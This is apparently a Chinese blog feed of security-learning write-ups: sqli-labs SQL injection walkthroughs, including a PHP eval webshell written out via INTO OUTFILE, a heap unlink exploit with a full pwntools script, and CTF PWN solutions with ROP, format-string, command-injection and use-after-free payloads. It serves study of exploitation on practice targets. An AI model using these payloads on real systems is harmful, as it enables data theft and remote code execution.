src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_imag32e008.jpg" alt="img"></p><p>可以通过报错注入回显出结果，其他步骤和payload同less5，使用less5的注入代码，并且把id=0后的单引号改为双引号即可</p><p>最后查询表中内容输入如下</p><p>接下来查询内容，输入?id=0&quot;union select count(*),1, concat(’~’,( select username from users limit 1,1),’~’, floor(rand()*2)) as a from information_schema.tables group by a – -</p><p>和</p><p>?id=0&quot; union select count(*),1, concat(’~’,( select password from users limit 1,1),’~’, floor(rand()*2)) as a from information_schema.tables group by a – -</p><p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image01045.jpg" alt="img"></p><p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image01223.jpg" alt="img"></p><h2 id="less-7"><a class="markdownIt-Anchor" href="#less-7"></a> Less 7</h2><p>输入?id=1,?id=1’,?id=1&quot;测试注入点，当输入id=1’的时候报错，显示如下，说明存在单引号字符型注入</p><p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image01124.jpg" alt="img"></p><p>输入?id=1’ and 1=1 – - 报错，显示如下，说明可能存在括号</p><p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image01326.jpg" alt="img"></p><p>测试有多少个括号，最后输入?id=1’ )) and 1=1 – -未报错，显示如下，说明得需要2个括号闭合</p><p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image011238.jpg" alt="img"></p><p>提示我们得使用outfile函数导出文件，然而这个函数是有要求的，首先我们得知道绝对的文件物理路径，还得对这个路径有可写入的权限</p><p>在地址栏输入</p><p>?id=1’)) union select 1,2,’<?php @eval($_POST["cmd"]);?>’ into outfile “D:\phpstudy_pro\WWW\sqli-labs-master\Less-7”-- -</p><p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image04220.gif" alt="img"></p><p>可以看到这个路径确实写入了我们的一句话木马，然后用菜刀连接</p><p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image02322.gif" alt="img"></p><p>这时可以连接上并且可以对文件进行操作了</p><h2 id="less-8"><a class="markdownIt-Anchor" href="#less-8"></a> Less 8</h2><p>输入?id=1，回显如下</p><p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image02302.jpg" alt="img"></p><p>可以说明是布尔型注入，输入?id=1’没有回显，说明可能是基于单引号的布尔注入</p><p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image00%E4%B8%BA4.jpg" alt="img"></p><p>尝试使用报错注入的时候没有回显，所以我们不能用报错注入。尝试时间盲注</p><p>输入?id=1’ and if(length(database())=8,sleep(5),1)-- -</p><p>*这里不正确执行select 1页面正常返回，正确则执行select sleep(5)页面沉睡5秒后返回</p><p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image00r36.jpg" alt="img"></p><p>有明显延迟，说明数据库长度为8，接下来爆破库名</p><p>?id=1’and if(ascii(substr(database(),1,1))=115,sleep(5),1)-- -</p><p>如下图，有明显延迟，说明库的第一个字符acii码为115（s）</p><p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image0sd208.jpg" alt="img"></p><p>其他字段调整(substr(database(),x,1)中x大小得出数据库名字是’security’</p><p>接下来爆破表的内容</p><p>?id=1’and if(ascii(substr((select table_name from information_schema.tables where table_schema=‘security’ limit 3,1),1,1))=117 ,sleep(5),1)-- -</p><p>这里limit x,1),y,1)的x表示第x+1个表，y表示表名第y位数，用ASCII码判断</p><p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image0102.jpg" alt="img"></p><p>延迟明显说明猜测正确，这里最后得出第三个表是user表</p><p>接下来爆表中的名字，输入</p><p>?id=1’and if(ascii(substr((select column_name from information_schema.columns where table_name=‘users’ limit 3,1),1,1))=105, sleep(5),1)-- -</p><p>这里limit x,1),y,1)的x表示第x+1列，y表示列名第y位数，用ASCII码判断</p><p>然后爆破列的内容用</p><p>?id=1’and if(ascii(substr((select username from users limit 0,1),1,1))=68, sleep(5),1) – -</p><p>这里limit x,1),y,1)的x表示第x+1个内容，y表示内容的第y位数，用ASCII码判断</p><p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image01342.jpg" alt="img"></p><p>请求有明显延迟则判断成功</p><h2 id="less-9"><a class="markdownIt-Anchor" href="#less-9"></a> Less 9</h2><p>这里不管输入什么，下图输入1或者1’，回显总是You are in…</p><p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image32014.jpg" alt="img"><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_imag3e016.jpg" alt="img"></p><p>题目提示是基于时间的盲注，经过尝试，当输入?id=1’ and sleep(5) – -延迟明显，说明注入成功</p><p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_23image018.jpg" alt="img"></p><p>由于我们上一关就是使用的时间盲注，所以直接用上一题的payload</p><p>输入?id=1’ and if(length(database())=8,sleep(5),1)-- -，查询数据库长度</p><p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image3020.jpg" alt="img"></p><p>延迟明显，说明可以注入，之后操作同less8</p><h2 id="less-10"><a class="markdownIt-Anchor" href="#less-10"></a> Less 10</h2><p>这里和上一关一样，不管输入什么都会显示you are in….，通过测试，当输入?id=1&quot; and sleep(5) – -时，延迟明显，说明存在双引号注入</p><p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image123022.jpg" alt="img"></p>]]></content>
    
    
    <categories>
      
      <category>web学习</category>
      
      <category>学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>unlink漏洞学习</title>
    <link href="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
    <url>/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="堆的unlink漏洞学习"><a class="markdownIt-Anchor" href="#堆的unlink漏洞学习"></a> 堆的unlink漏洞学习</h1><h2 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h2><p>做实验做到的堆部分，第一个就是这个，以前没怎么详细做过堆的题，理解起来真的困难，看了几天才能理解，还是太菜了。就决定要把这个记录下来TAT</p><h2 id="unlink基本原理"><a class="markdownIt-Anchor" href="#unlink基本原理"></a> Unlink基本原理</h2><p>Unlink的目的是把一个双向链表中的空闲块拿出来（例如 free 时和目前物理相邻的 free chunk 进行合并）。其基本的过程如下</p><img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/unlink.png" alt="unlink基本原理" style="zoom:67%;"><p>目的是为了把图中的P拿出来，然后使FD-&gt;bk=BK 以及BK-&gt;fd=FD，其实这里说的也已经很清楚<a href="https://wiki.x10sec.org/pwn/linux/glibc-heap/unlink-zh/#_2">CTF wiki unlink</a>，不过我就是不明白unlink的一个检查机制</p><p>双向链表指针破坏：前一个块的 fd 和下一个块的 bk 应该指向当前 unlink</p><p>块。当攻击者使用 free -12 和 shellcode 地址覆</p><p>盖 fd 和 bk 时， free 和 shellcode 地址 + 8 就不会指向当前 unlink 块</p><p>（ second ）。因此 glibc malloc 就抛出双向链表指针破坏错误。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="hljs-number">0</span>))<br><span class="hljs-built_in">malloc_printerr</span> (check_action, <span class="hljs-string">&quot;corrupted double-linked</span><br><span class="hljs-string">list&quot;</span>, P); <br></code></pre></td></tr></table></figure><p>以及这个机制的绕过，这个机制主要是验证p-&gt; fd-&gt; bk == p 和 p-&gt; bk-&gt; fd == p</p><p>绕过主要是令伪造堆快的fd=这个堆快的指针位置-3*偏移，以及bk=这个堆快的指针位置-2*偏移</p><p>这个看得我真的很绕，一时间理解不能，还是太菜了（还有就是这类题都会有个全局指针？）</p><p>不过做了一道题后理解就很清楚了，果然不能光看。</p><h2 id="2014-hitcon-stkof"><a class="markdownIt-Anchor" href="#2014-hitcon-stkof"></a> 2014 HITCON stkof</h2><p>程序开启了canary和堆栈不可执行保护</p><img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213154332.png" alt="检查" style="zoom:67%;">                       <p>程序运行后没有什么显示，但是根据ida查看可以知道，程序有3个功能</p><img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213239564.png" alt="运行" style="zoom:67%;"><p>输入1是申请堆块，然后输入大小，这里注意有一个全局变量，每次申请的内存地址都存放在这个全局变量中</p> <img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213308210.png" alt="输入1的函数" style="zoom:67%;"><p>输入2是编辑堆块，先输入目录号，然后输入长度，再输入内容</p> <img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213349366.png" alt="输入2的函数" style="zoom:67%;"><p>输入3是进行free的操作</p> <img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213416269.png" alt="输入3的操作" style="zoom:67%;"><p><strong>注意这里所有操作都是通过全局变量指针s来进行的</strong></p><h3 id="利用思路"><a class="markdownIt-Anchor" href="#利用思路"></a> 利用思路</h3><ol><li><p>首先创建4个堆块，3号堆块必须不是fastbin，不然不会向前合并，然后在2号堆块伪造chunk，令fd=chunk2的全局变量指针-0x18，bk= chunk2的全局变量指针-0x10</p></li><li><p>在第二个堆块中伪造fake chunk，然后free第三个堆块进行unlink，unlink操作会把伪造堆块的fd写入原来全局变量的chunk2的指针处。</p></li><li><p>这时候修改chunk2，因为chunk2的指针是就等于修改chunk2的全局变量指针-0x18处的值。</p></li><li><p>编辑chunk2（也就是chunk2的全局变量指针-0x18）开始编辑，把free的got表覆盖全局变量的chunk1指针处，然后通过编辑功能修改chunk1指针（也就是free的got表）为put的plt表，然后free掉chunk2，就可以泄露处put的真实地址，然后计算system和bin/sh的真实地址</p></li><li><p>最后把free的got表覆盖为system的地址，然后编辑chunk4中为/bin/sh的地址，然后free掉chunk4，触发system（/bin/sh）即可完成利用</p></li></ol><h3 id="攻击过程"><a class="markdownIt-Anchor" href="#攻击过程"></a> 攻击过程</h3><p>首先创建4个堆块，大小分别为0x20，0x30，0x80，0x20，堆块3不能是fastbin，否则不能触发合并。</p> <img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213459651.png" alt="创建堆快" style="zoom:67%;"><p>查看全局变量s的位置，4个堆块的指针都记录在上面</p> <img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213531336.png" alt="全局变量查看" style="zoom:67%;"><p>然后修改chunk2伪造堆块</p> <img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213556648.png" alt="伪造的chunk2" style="zoom:67%;"><p>0是伪造堆块的prev_size，0x30是size</p><p>0x602138是chunk2的全局变量指针-0x10(这里是0x612150-0x18)在伪造堆块的fd位置</p><p>0x602140是chunk2的全局变量指针-0x10(这里是0x612150-0x18)在位置堆块的bk位置</p><p>然后覆盖chunk3的prev_size为0x30，size为0x90，让系统以为伪造的堆块处于空闲状态</p><p>进行free（3）的操作后，判断伪造的chunk2是处于空闲状态，然后判断</p><p>p-&gt; fd-&gt; bk = = p 和 p-&gt; bk-&gt; fd ==p，这里p-&gt; fd=0x602138，然后从0x602138取4个地址偏移的位置（看成一个0x602138起始的堆块取bk），刚刚好是全局指针0x602150=&gt;0x2846460=p，验证通过，然后p-&gt; bk-&gt; fd ==p的过程同上。</p><p>然后进行unlink操作</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++">FD = p-&gt;fd;<br>BK = p-&gt;bk;<br>FD-&gt;bk = BK;<br>BK-&gt;fd = FD;<br></code></pre></td></tr></table></figure><p>这里FD-&gt;bk和BK-&gt;fd都是chunk2在全局变量指针中的地址，最后会进行BK-&gt;fd = FD，把伪造chunk2的FD复制到chunk2全局变量指针的位置，结果如下</p> <img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213704244.png" alt="最后进行的BK->fd操作" style="zoom:67%;"><p>可以看到0x602150（原来chunk2的指针位置）被覆盖成了伪造chunk2的FD（0x602138）</p><p>然后进行修改chunk2的操作（先从全局变量取指针0x602150-&gt;0x602138），然后就可以修改0x602138的位置的内容，这时把chunk1的全局变量指针改为free的got表地址，chunk2的全局变量指针改为put的plt表地址（用于put出put函数真实地址）</p> <img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213750481.png" alt="编辑chunk1" style="zoom:67%;"><p>这里0x602148和0x602150已经被修改为free_got和put_plt</p><p>然后进行修改chunk1的操作，就会从0x602148取指针（free_got）然后就可以把free的got表地址修改为put_got的地址</p><p>进行free（2）的操作，实际上是put出put_plt泄露出真实地址</p> <img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213836064.png" alt="泄露的put真实地址" style="zoom:67%;"><p>后续操作就是计算system已经/bin/sh的地址了，最后同上修改free的got表地址为system的地址，修改chunk4为/bin/sh，进行free（4）的操作就可以了。</p><p>脚本如下，参考了https://bbs.pediy.com/thread-247007.htm</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment"># -*- coding:utf-8 -*-</span><br> <br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br> <br>context(log_level = <span class="hljs-string">&quot;debug&quot;</span>,os = <span class="hljs-string">&quot;linux&quot;</span>)<br><br>p = process(<span class="hljs-string">&quot;./stkof&quot;</span>)<br> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">malloc</span>(<span class="hljs-params">size</span>):</span><br>    p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">&quot;OK\n&quot;</span>)<br> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>    p.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,strings</span>):</span><br>    p.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(strings)))<br>    p.send(strings)<br>    p.recvuntil(<span class="hljs-string">&quot;OK\n&quot;</span>)<br> <br>malloc(<span class="hljs-number">0x20</span>)<br>malloc(<span class="hljs-number">0x30</span>)<br>malloc(<span class="hljs-number">0x80</span>)<br>malloc(<span class="hljs-number">0x20</span>)<br><span class="hljs-comment">#创建4个堆快，第三个用来free的堆快不能是fastbin</span><br><br>target = <span class="hljs-number">0x602140</span> + <span class="hljs-number">0x10</span><br>fd = target - <span class="hljs-number">0x18</span><br>bk = target - <span class="hljs-number">0x10</span><br><br>payload = p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#伪造堆块的prev_size</span><br>payload += p64(<span class="hljs-number">0x30</span>) <span class="hljs-comment">#伪造堆块的size</span><br>payload += p64(fd) + p64(bk)<br>payload += <span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x10</span><br>payload += p64(<span class="hljs-number">0x30</span>) + p64(<span class="hljs-number">0x90</span>)  <span class="hljs-comment">#更改chunk3的标志位，会认为前一个堆快是空闲的触发unlink</span><br>edit(<span class="hljs-number">2</span>,payload)<br><br>free(<span class="hljs-number">3</span>)<br>p.recvuntil(<span class="hljs-string">&quot;OK\n&quot;</span>)<br><br>elf = ELF(<span class="hljs-string">&quot;./stkof&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br> <br>free_got = elf.got[<span class="hljs-string">&quot;free&quot;</span>]<br>puts_got = elf.got[<span class="hljs-string">&quot;puts&quot;</span>]<br>puts_plt = elf.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br>payload2 = <span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x10</span> <br>payload2 += p64(free_got) + p64(puts_got)<br>edit(<span class="hljs-number">2</span>,payload2)<br><br>payload3 = p64(puts_plt)<br>edit(<span class="hljs-number">1</span>,payload3)<br><span class="hljs-comment">#修改chunk1的操作，就会从0x602148取指针（free_got）然后就可以把free的got表地址修改为put_got的地址 </span><br>free(<span class="hljs-number">2</span>)<br>puts_addr = u64(p.recvuntil(<span class="hljs-string">&quot;\nOK\n&quot;</span>,drop = <span class="hljs-literal">True</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br><br><span class="hljs-comment">#gdb.attach(p)</span><br>puts_offset = libc.symbols[<span class="hljs-string">&quot;puts&quot;</span>]<br>system_offset = libc.symbols[<span class="hljs-string">&quot;system&quot;</span>]<br>binp_offset = libc.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>).<span class="hljs-built_in">next</span>()<br> <br>libc_base = puts_addr - puts_offset<br> <br>system_addr = libc_base + system_offset<br> <br>payload4 = p64(system_addr)<br><br>edit(<span class="hljs-number">1</span>,payload4)<br><span class="hljs-comment">#再次修改chunk1，把free_got修改为system的地址</span><br><br>edit(<span class="hljs-number">4</span>,<span class="hljs-string">&quot;/bin/sh\00&quot;</span>)<br>free(<span class="hljs-number">4</span>)<br> <br>p.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>PWN学习</category>
      
      <category>学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PWN学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CUMTCTF春季赛-PWN</title>
    <link href="/2021/03/30/cumtctf/"/>
    <url>/2021/03/30/cumtctf/</url>
    
    <content type="html"><![CDATA[<p>首先庆祝一下咋队得第二吧（原来是第二的，把密码学交了就显示第一了，当时没做出来）</p><p><img src="/2021/03/30/cumtctf/%E7%AC%AC%E4%B8%80.png" alt="图片"></p><h1 id="pwn1"><a class="markdownIt-Anchor" href="#pwn1"></a> PWN1</h1><p>查看程序，逻辑是读取你输入的字符串，然后和CUMTCTF对比，如果通过就执行bin/sh</p><p><img src="/2021/03/30/cumtctf/1.jpg" alt="img"></p><p>在比较前下个断点，进行调试，发现此时对比的是地址0x4008d5</p><p><img src="/2021/03/30/cumtctf/2.jpg" alt="img"></p><p>在看程序中输入的格式是“ld”，说明我们只能输入长整形，所以我们把0x4008d5转换为10进制进行输入4196565，然后调试.，发现此时验证通过了。</p><p><img src="/2021/03/30/cumtctf/3.jpg" alt="img"></p><p>拿到flag</p><p><img src="/2021/03/30/cumtctf/4.jpg" alt="img"></p><h1 id="pwn2"><a class="markdownIt-Anchor" href="#pwn2"></a> PWN2</h1><p>先检查程序，发现程序开启了canary保护和堆栈不可执行</p><p><img src="/2021/03/30/cumtctf/5.jpg" alt="img"></p><p>然后查看程序，程序会先执行一个fmt（）函数，可以发现这里有一个格式字符串的漏洞，可以泄露canary值</p><p><img src="/2021/03/30/cumtctf/6.jpg" alt="img"></p><p>然后执行vul（）函数，可以看到这个函数读取的buf有0x64字节，而buf只有0x20字节存在栈溢出</p><p><img src="/2021/03/30/cumtctf/7.jpg" alt="img"><img src="/2021/03/30/cumtctf/8.jpg" alt="img"></p><p>所以解题思路是先泄露canary，然后构建rop链泄露puts函数地址，然后重启程序，再次泄露canary地址，构建rop链getshell</p><p><img src="/2021/03/30/cumtctf/9.jpg" alt="img"></p><p>因为canary的值距离栈顶是0x8个字节，64位Linux前六个参数用寄存器传递， 后面的才从栈上读取，所以要使var_8是printf函数的第8个参数，因此使用“%7$p”作为printf参数可以泄露出canary的值。所以payload如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs python">\<span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.binary=<span class="hljs-string">&#x27;pwn2&#x27;</span><br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn2&#x27;</span>)<br><br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br>\<span class="hljs-comment">#p=process(&#x27;./pwn2&#x27;)</span><br><br>p = remote(<span class="hljs-string">&quot;1.15.81.218&quot;</span>,<span class="hljs-number">10001</span>)<br><br>pop_rdi=<span class="hljs-number">0x400983</span><br><br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br>start_addr=<span class="hljs-number">0x4006A0</span><br><br> <br><br>p.recvuntil(<span class="hljs-string">&quot;fmtstr,Do you konw it?&quot;</span>)<br><br>\<span class="hljs-comment"># 泄露canary</span><br><br>payload = <span class="hljs-string">&quot;%7$p&quot;</span><br><br>p.sendline(payload)<br><br>Canary=<span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">&quot;00&quot;</span>),<span class="hljs-number">16</span>)<br><br>log.info(<span class="hljs-string">&quot;Canary:&quot;</span>+<span class="hljs-built_in">hex</span>(Canary)) <br><br>p.recvuntil(<span class="hljs-string">&quot;Remeber canary!!&quot;</span>)<br><br>\<span class="hljs-comment">#构造rop链泄露puts的地址，然后重启程序</span><br><br>payload = <span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">24</span>+p64(Canary)+<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">8</span>+p64(pop_rdi)+p64(puts_got) + p64(puts_plt)+p64(start_addr)<br><br>p.send(payload)<br><br>\<span class="hljs-comment">#接收put真实地址</span><br><br>puts_addr = u64(p.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&quot;\x00&quot;</span>)) <br><br>\<span class="hljs-comment">#计算libc基址</span><br><br>libc_base = puts_addr - libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br>\<span class="hljs-comment">#获取程序中system的地址和/bin/sh的地址</span><br><br>binsh_addr = libc.search(<span class="hljs-string">&quot;/bin/sh&quot;</span>).<span class="hljs-built_in">next</span>()+libc_base<br><br>system_addr=libc_base+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br> <br><br>p.recvuntil(<span class="hljs-string">&quot;fmtstr,Do you konw it?&quot;</span>)<br><br>\<span class="hljs-comment">#再次泄露canary值</span><br><br>payload = <span class="hljs-string">&quot;%7$p&quot;</span><br><br>p.sendline(payload)<br><br>Canary=<span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">&quot;00&quot;</span>),<span class="hljs-number">16</span>)<br><br>log.info(<span class="hljs-string">&quot;Canary:&quot;</span>+<span class="hljs-built_in">hex</span>(Canary)) <br><br>p.recvuntil(<span class="hljs-string">&quot;Remeber canary!!&quot;</span>)<br><br>\<span class="hljs-comment">#构造rop链getshell</span><br><br>payload2 = <span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">24</span>+p64(Canary)+<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">8</span>+p64(pop_rdi)+p64(binsh_addr)+p64(system_addr)<br><br>p.sendline(payload2)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="pwn3"><a class="markdownIt-Anchor" href="#pwn3"></a> PWN3</h1><p>用ida打开程序，发现程序是一个选择菜单</p><p><img src="/2021/03/30/cumtctf/10.jpg" alt="img"></p><p>然后在选择1中，说是执行ping命令，但是没有进行过滤，会用system函数执行我们输入进去的命令</p><p><img src="/2021/03/30/cumtctf/11.jpg" alt="img"></p><p>选择1，然后1;cat flag，即可拿到Flag</p><p><img src="/2021/03/30/cumtctf/12.jpg" alt="img"></p><h1 id="pwn4"><a class="markdownIt-Anchor" href="#pwn4"></a> PWN4</h1><p>Ida打开程序，发现也是一个选择菜单</p><p><img src="/2021/03/30/cumtctf/a1.jpg" alt="img"></p><p>仔细观察每个选择，发现漏洞点在2.delete中，函数只是free了堆块，但是没有把指针置空，会造成uaf漏洞</p><p><img src="/2021/03/30/cumtctf/%E9%98%BF.jpg" alt="img"></p><p>Gdb调试：</p><p>先申请2个32字节的堆块（size为16 24 32的堆块free后会进入fastbin不会被合并）</p><p>可以看到我们申请的堆块对应一个内存堆和一个print_heap_name函数</p><p><img src="/2021/03/30/cumtctf/clip_image012.jpg" alt="img"></p><p>然后删除这两个堆块，可以看到删除的堆块进入了fastbin</p><p><img src="/2021/03/30/cumtctf/clip_image014.jpg" alt="img"></p><p>这时候我们申请一个堆块，size为8，内容为cccc</p><p><img src="/2021/03/30/cumtctf/clip_image016.jpg" alt="img"></p><p>此时覆盖了第一个堆块的print_heap_name函数指针</p><p><img src="/2021/03/30/cumtctf/clip_image018.jpg" 